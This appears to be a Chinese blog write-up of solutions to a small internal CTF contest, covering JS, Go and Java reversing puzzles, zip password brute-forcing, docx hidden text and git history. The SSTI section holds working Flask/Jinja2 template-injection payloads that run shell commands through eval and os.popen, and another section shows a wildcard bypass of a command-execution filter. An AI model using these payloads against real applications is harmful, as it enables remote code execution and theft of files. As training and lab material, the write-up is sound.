---
title: 几道简单的CTF题目思路
tag:
  - CTF
  - Python
  - Java
keywords:
  - CTF
date: 2021-08-23 13:46:20
category: 算法&数学
description: 关于几道简单的CTF题目思路。
---
##  前言

公司内部举行的小比赛，之前从未参与过此类比赛，所以各位看官大佬多多指教。简单来说就是给出题目从中找出flag就成功了，flag格式为`flag{32位md5加密字符串}`。感觉其中几道有点意思，记录一下！

## hard-js

关于JS的一道题，主要是要分析js代码。从源码中可以看出flag的32位md5串每一位都可以推算出来：

```javascript
<script>
	var check = document.getElementById('check')
	check.onclick = function() {
		var t = document.getElementById('flag').value;
		checkFlag(t) ? alert("Congratulations!!! Your flag is " + t) : alert("You need good good study~~")
	}
	function checkFlag(f) {
		l = []
		for (let i of f) {
			l.push(i.charCodeAt())
		}
		return (
			f.length === 38
			&& l[10] === 51
			&& sub(l[6], l[5]) === 1
			&& f.substring(37, 38) === '}'
			&& l[6] === l[7]
			&& mul(l[10], 2) === l[12]
			&& sub(l[9], l[8]) === 1
			&& l[7] === l[8]
			&& f.substring(0, 5) === 'flag{'
			&& div(l[9], 2) === sub(l[10], 1)  
			&& add(l[10], l[11]) === add(l[12], 6)
			&& btoa(f.substring(13, 21)) === "MDMzOGIwNmE="
			&& e_l(l.slice(21,29).reverse(), [48, 101, 52, 56, 56, 102, 102, 53])
			&& c(l.slice(29,37))
			)
	}
	function add(a, b) {
		return a+b
	}
	function sub(a, b) {
		return a-b
	}
	function mul(a, b) {
		return a*b
	}
	function div(a, b) {
		return Math.floor(a/b)
	}
	function xor(a, b) {
		return a^b
	}
	function e_l(a, b) {
		a.forEach((i,j)=>{
			if (i !== b[j]) {
				return false
			}
		})
		return true
	}
	function c(a){
		return 
		a[0]+a[1]+a[2]+a[3]+a[4]+a[5]+a[6]+a[7]==604 &&
		a[0]-a[1]-a[2]-a[3]-a[4]-a[5]-a[6]-a[7]==-406 &&
		a[1]+a[3]+a[5]+a[7]-a[6]-a[2]-a[0]-a[4]==6 &&
		a[0]+a[1]-a[2]-a[3]==-3 &&
		a[0]-a[1]+a[2]+a[3]==201 &&
		a[4]-a[5]+a[6]+a[7]==109 &&
		a[4]+a[5]-a[6]-a[7]==-1 &&
		a[1]+a[3]-a[5]*a[7]==-5394 &&
		a[0]+a[2]-a[4]*a[6]==-5145
	}
</script>
```

前面几位都比较简单，主要是后面几位是一个八元一次方程，可以写一个java代码暴力解出方程解。

```java
/**
 * @author ycyin
 * @Classname Main
 * @Description 暴力破解最后几位数
 * @Date 2021/8/13/0013 14:10
 * 前面几位数都很简单，后面几位暴力破解
 * i0和i4手动列方程算的
 */
public class Main {
    public static void main(String[] args) {
        for (int i1 = 48; ((i1 <= 57 && i1 >= 48) || (i1 >= 97 && i1 <= 122)); i1++) {
            // System.out.println("i1="+i1);
            for (int i2 = 48; (i2 <= 57 && i2 >= 48) || (i2 >= 97 && i2 <= 122); i2++) {
                for (int i3 = 48; (i3 <= 57 && i3 >= 48) || (i3 >= 97 && i3 <= 122); i3++) {
                    for (int i5 = 48; (i5 <= 57 && i5 >= 48) || (i5 >= 97 && i5 <= 122); i5++) {
                        for (int i6 = 48; (i6 <= 57 && i6 >= 48) || (i6 >= 97 && i6 <= 122); i6++) {
                            for (int i7 = 48; (i7 <= 57 && i7 >= 48) || (i7 >= 97 && i7 <= 122); i7++) {
                                if (99 + i1 + i2 + i3 + 54 + i5 + i6 + i7 == 604 &&
                                        99 - i1 - i2 - i3 - 54 - i5 - i6 - i7 == -406 &&
                                        i1 + i3 + i5 + i7 - i6 - i2 - 99 - 54 == 6 &&
                                        99 + i1 - i2 - i3 == -3 &&
                                        99 - i1 + i2 + i3 == 201 &&
                                        54 - i5 + i6 + i7 == 109 &&
                                        54 + i5 - i6 - i7 == -1 &&
                                        i1 + i3 - i5 * i7 == -5394 &&
                                        99 + i2 - 54 * i6 == -5145) {
                                    System.out.println("99" + " " + i1 + " " + i2 + " " + i3 + " " + "54" + " " + i5 + " " + i6 + " " + i7);
                                }
                                if (i7 == 57) { i7 = 96; }
                            }
                            if (i6 == 57) { i6 = 96; }
                        }
                        if (i5 == 57) { i5 = 96; }
                    }
                    if (i3 == 57) { i3 = 96; }
                }
                if (i2 == 57) { i2 = 96; }
            }
            if (i1 == 57) { i1 = 96; }
        }
    }
}
```

解出来每一位是十进制数，转acsii码即可。在线工具：http://www.ab126.com/goju/1711.html

## zip1024

这是一道zip加密压缩的题，包含答案的文档被反复加密压缩1024次，但是密码比较简单，通过暴力破解zip解压工具得出文档加密密码为`1024`这四位数字的组合。最终通过python脚本反复解压缩解出。生成字典、暴力破解工具见附件（要破解的源压缩包没有了）。

```python
#-*-coding:utf-8-*-
import zipfile
import os
import re
from threading import Thread

#password='1234'
def pojie_zip(path,password,zip):
 if path[-4:]=='.zip':
  #path = dir+ '\\' +file
  #print path
  #print(path)
  try:
   #若解压成功，则返回True,和密码
   zip.extractall(path='C:\\Users\\y\\Desktop\\zipDeep',members=zip.namelist() , pwd=password.encode('ascii'))
   print(' ----success!,The password is %s' % password)
   zip.close()
   return True
  except Exception as e:
   #print(e)   
   pass #如果发生异常，不报错
 #print('error')
  
  
def get_pass():
 #压缩文件的路径
 path = r'C:\\Users\\y\\Desktop\\zipDeep\\1024.zip'
 print('正在尝试解压 %s'% path)
 for i in range(2048): 
   zip = zipfile.ZipFile(path, "r",zipfile.zlib.DEFLATED)
   #print(zip.namelist())
   #print(zip.namelist()[0][0:4])
   #密码字典的路径
   passPath='C:\\Users\\y\\Desktop\\zipDeep\\passwd.txt'
   passFile=open(passPath,'r')
   for line in passFile.readlines():
    password=line.strip('\n')
    #print('Try the password %s' % password)
    if pojie_zip(path,password,zip):
     pattern = re.compile(r'[0-4]{4}')
     #print(pattern.findall(path))
     path = re.sub(pattern, zip.namelist()[0][0:4], path)
     print('正在尝试解压 %s'% path)
     break
 passFile.close()
if __name__=='__main__':
 get_pass()

```

## docx

这是一道关于docx文档的题，先是一个加密的压缩包需要暴力破解拿到里面的word文档。

思路一：打开文档里面一片空白，鼠标点击文档中间发现被一个白底无边框文本框遮住，删除这个文本框。然后发现还是一片空白，鼠标点击可以发现文档中是有内容的，点开字体设置里面，发现字体颜色为白色，真相大白！修改字体颜色或者修改背景都可以让隐藏在白色文档背景中的白色字显示出来。

思路二：直接修改.docx文档后缀为.zip，然后解压缩打开`/word/document.xml`文件中包含文档中的文字内容。

## ssti漏洞

属于一个flask框架的ssti漏洞，网上搜一下就懂了，先通过`http://172.x.x.x:xxxx/?name={{2*2}}`返回了4，就说明存在模版注入漏洞。执行脚本可以执行任意命令。

执行ls查看文件目录：

```python
{% for c in ().__class__.__bases__[0].__subclasses__(): %}
{% if c.__name__ == '_IterationGuard': %}
{{c.__init__.__globals__['__builtins__']['eval']("__import__('os').popen('ls -a').read()") }}
{% endif %}
{% endfor %}
```

执行cat命令查看文件内容：

```python
{% for c in ().__class__.__bases__[0].__subclasses__(): %}
{% if c.__name__ == '_IterationGuard': %}
{{c.__init__.__globals__['__builtins__']['eval']("__import__('os').popen('cat /flag').read()") }}
{% endif %}
{% endfor %}
```

## 查看文件

题目给出一个地址，参数为linux命令，后台回去执行返回结果。使用命令查看flag文件，要求命令中不能出现flag单词。

尝试各种读文件命令：

```vim
cat--由第一行开始显示内容，并将所有内容输出
tac--从最后一行倒序显示内容，并将所有内容输出
more-- 根据窗口大小，一页一页的现实文件内容
less 和more类似，但其优点可以往前翻页，而且进行可以搜索字符
head-- 只显示头几行
tail --只显示最后几行
nl --类似于cat -n，显示时输出行号
tailf-- 类似于tail -f
vim --使用vim工具打开文本
vi --使用vi打开文本cat 由第一行开始显示内容，并将所有内容输出
```

发现只有tac命令可以使用，随后使用通配符`*`或者`?`可以查看flag文件，即`tac /f* `或`tac /fla?`。

## git命令

该题答案出现在git历史提交记录中，先通过`git log`查看提交记录，然后使用`git diff` 或`git reset --hard commit_id`命令查看历史commit中提交的信息。

## 逆向go语言

这个题考查的是go语言的逆向，作为一个开发的我不怎么会逆向，还是直接暴力好了。题目源码如下：

```go
package main

import (
  "fmt"
  "strconv"
)

func main() {

  input := "flag{********************************}"
  fmt.Println(transform(input[5:37]))
  // a72147bfc9985a7566ab007e1d5c724b
}
func convert(m int64) int64{
  m = m ^ m >> 13
  m = m ^ m << 9 & 2029229568
  m = m ^ m << 17 & 2245263360
  m = m ^ m >> 19
  return m
}

func transform(message string) string{
  newMessage := ""
  for i := 0; i < len(message)/8; i++ {
    block := message[i * 8 : i * 8 + 8]
    t, _ := strconv.ParseInt(block, 16, 64)
    r := convert(t)
    formatInt := fmt.Sprintf("%02s", strconv.FormatInt(r, 16))
    newMessage += formatInt
  }
  return newMessage
}
```

逆向步骤：

本地没有go语言环境，先找一个go在线工具：https://c.runoob.com/compile/21

根据题目中给的结果字符串：a72147bfc9985a7566ab007e1d5c724b

1.我们将结果字符串分4次每次8位,16进制转int64类型（用go转,java没有int64的概念）

```go
t, _ := strconv.ParseInt("1d5c724b", 16, 64)

fmt.Println(t)
```

得到结果： 2803976127 3382205045 1722482814 492597835

2.上述结果进行convert逆转换

这里使用java进行暴力破解：因为go的int64是10位，结果必定是10位，所以我们就取从10位最小数到最大数进行暴力

```java
    for (long i = 1000000000L;i< 9999999999L;i++){
        long m = i ^ i >> 13;
        m = m ^ m << 9 & 2029229568L;
        m = m ^ m << 17 & 2245263360L;
        m = m ^ m >> 19;
        if (m==2803976127L || m==3382205045L||m==1722482814L || m == 492597835L){
            System.out.println(m+"原来的值="+i);
        }
    }
```

得到结果：1261804791 1973250989 2144199876 3833123366

这个结果就是flag中md5的16进制字符串转换而来

3.将上述结果串分别转为16进制，同样用go转

```go
formatInt := fmt.Sprintf("%02s", strconv.FormatInt(3833123366, 16))
fmt.Println(formatInt)
```

得到结果：4b359cf7   759d6bad   7fcde4c4 e478d226

拼接起来4b359cf7759d6bad7fcde4c4e478d226

所以答案就是：flag{4b359cf7759d6bad7fcde4c4e478d226}

## 特殊编码算法

第一次了解到还有**社会主义编码**算法， **特征：** 密文字符全部是社会主义核心价值观。

## xor_java

关于java异或运算的题。直接爆破

```java
import java.util.Arrays;
import java.util.Random;

public class XorJava{

    private static final char[] FLAG = "flag{********************************}".toCharArray();
    public static void main(String[] args) {
        Random random = new Random();
        int ran = random.nextInt(10) + 99;
        // ran = 107; 通过不断测试发现只有107时，结果前面几位可以对上
        int[] key = new int[]{151, 157, 163, 167, 173, 179, 181, 191, 193, 197, 199, 211, 223, 227, 229, 233, 239,
                241, 251, 257, 263, 269, 271, 277, 281, 283, 293, 307, 311, 313, 317, 331, 337, 347, 349, 353, 359, 367};
        int[] res = new int[key.length];
        for (int i = 0; i < res.length; i++) {
            res[i] = (FLAG[i] ^ key[i]) % ran;
        }
        System.out.println(Arrays.toString(res));
        // [27, 27, 87, 85, 0, 24, 27, 36, 29, 28, 57, 69, 82, 104, 103, 34, 32, 41, 95, 38, 33, 103, 105, 54, 83, 84, 6, 15, 43, 50, 56, 88, 94, 41, 41, 42, 15, 60]

        // ↑上面是题目
        // 发现flag的'f'^key[0] == result[0]   暴力解就好了
        int[] result = new int[]{27, 27, 87, 85, 0, 24, 27, 36, 29, 28, 57, 69, 82, 104, 103, 34, 32, 41, 95, 38, 33,
                103, 105, 54, 83, 84, 6, 15, 43, 50, 56, 88, 94, 41, 41, 42, 15, 60};
        char[] xyz = "abcdefghijklmnopqrstuvwxyz0123456789{}".toCharArray();
        for (int i = 0; i < res.length; i++) {
            for (int y = 0; y < xyz.length; y++) {
                if ((xyz[y] ^ key[i]) % 107 == result[i]) {
                    System.out.print(xyz[y]);
                }
            }
        }
    }
}
```

## 不安全的随机数

依靠如下JAVA代码，然后给了一个随机数`3102864095391390798L`，要预测下一个随机数。

```java
public static long  getRandom(long nanoTime){
    long seed = 8006688675149558772L ^ nanoTime;
    Random random = new Random(seed);
    return random.nextLong();
}
```

这个问题评论区等候大佬解决。

## python逆向

逆向后的代码如下，评论区等候大佬解决。

```python
#! /usr/bin/env python 3.7 (3394)
#coding=utf-8
# Compiled at: 1969-12-31 18:00:00
#Powered by BugScaner
#http://tools.bugscaner.com/
#如果觉得不错,请分享给你朋友使用吧!
import os

def x(a, b):
    if not len(a) == len(b):
        raise AssertionError
    c = bytes()
    for i in range(len(a)):
        c += bytes([a[i] ^ b[i]])

    return c

def r(M, K):
    L = M[0:40]
    R = M[40:80]
    new_l = R
    s = x(R, L)
    new_r = x(s, K)
    return new_l + new_r

def f(m, K):
    for i in K:
        m = r(m, i)
    return m

def h(bs):
    return ''.join(['%02X' % b for b in bs]).lower()

K = []
for _ in range(7):
    K.append(os.urandom(40))

m = bytes('flag{********************************}', encoding='utf-8')
m += os.urandom(80 - len(m))
print(m)
m_k = h(f(m, K))
print(m_k)
print('The result is:')
print('f62acf3b006cbccbc921908e390257f71fdb632153527ad519d885ba88acb285e46e44d0547dc1f40089c05d849c2b1efcb731ae58320221b61b5066c683f7242253c50ea353729ececb5b172f684b17')
print('7cae592a4126037a78dc8ce3507c2060c14bde1b4e8f8c972714da70b5d0c50b4bc74fa7ff729f1862a734144e043f714ad89ef6f61b8bd93a4e7e4318fe60985d7c5abe578d20f553e5a7c59d84ca42')
print('a3ec04e7e28f46f4216f8f958f33f6bc7422168ae27a3229e570524f5347159d620025f6ff786fc02da3c78596a3a056eb793f3e286f3b93a49ab191d36fc596e2f4665a0dd42682a974b870ac8e570c')
```



## *附件：*

[1].hard-js原文档,<a :href="$withBase('/file/hard-js.zip')" download="hard-js.zip">点击下载</a>

[2].zip1024脚本和工具，<a :href="$withBase('/file/zipDeep.zip')" download="zipDeep.zip">点击下载</a>

[3].docx源文件，<a :href="$withBase('/file/docx.zip')" download="docx.zip">点击下载</a>

[4].ssti漏洞源文件，<a :href="$withBase('/file/ssti.zip')" download="ssti.zip">点击下载</a>

[5].go语言逆向源文件，<a :href="$withBase('/file/baby_go.zip')" download="baby_go.zip">点击下载</a>

## *参考：*

[1].[CTF常见编码及加解密（超全） - ruoli-s - 博客园 (cnblogs.com)](https://www.cnblogs.com/ruoli-s/p/14206145.html#社会主义编码)

[2].[Bugku-CTF分析篇-日志审计（请从流量当中分析出flag） - 0yst3r - 博客园 (cnblogs.com)](https://www.cnblogs.com/0yst3r-2046/p/12322110.html)

[3].[ASCII 在线转换器 -ASCII码-十六进制-二进制-十进制-字符串-ascii查询器 (ab126.com)](http://www.ab126.com/goju/1711.html)

[4].[由一道CTF信息泄露题而引发的对git命令的再次温习_xiaotaode2012的专栏-CSDN博客](https://blog.csdn.net/xiaotaode2012/article/details/77285036)

[5].[APK decompiler - decompile Android .apk ✓ ONLINE ✓ (javadecompilers.com)](http://www.javadecompilers.com/apk)

[6].[python反编译 - 在线工具 (tool.lu)](https://tool.lu/pyc)

[7].[在线pyc,pyo,python,py文件反编译，目前支持python1.5到3.6版本的反编译-在线工具 (bugscaner.com)](http://tools.bugscaner.com/decompyle/)

[8].[python-flask-ssti(模版注入漏洞) - 晓枫v5 - 博客园 (cnblogs.com)](https://www.cnblogs.com/hackxf/p/10480071.html)

[9].[针对CTF，大家都是怎么训练的？ - 知乎 (zhihu.com)](https://www.zhihu.com/question/30505597)

[10].[CTF资源库|CTF工具下载|CTF工具包|CTF工具集合 (ctftools.com)](https://www.ctftools.com/down/)

[11].[常见命令执行的一些绕过方式_H0ne的博客-CSDN博客](https://blog.csdn.net/qq_53142368/article/details/116152477)

[12].[解多元方程 (jfc120.com)](http://www.jfc120.com/fcs/)

[13].[FreeBuf网络安全行业门户](https://www.freebuf.com/)

[14].[flask SSTI漏洞_jiet07的博客-CSDN博客_flask ssti](https://blog.csdn.net/weixin_41603028/article/details/107865253)

[15].[SSTI(模板注入) - chalan630 - 博客园 (cnblogs.com)](https://www.cnblogs.com/chalan630/p/12578418.html)

[16].[Python压缩解压缩zip文件及破解zip文件密码的方法_huang714的专栏-CSDN博客](https://blog.csdn.net/huang714/article/details/106646328)



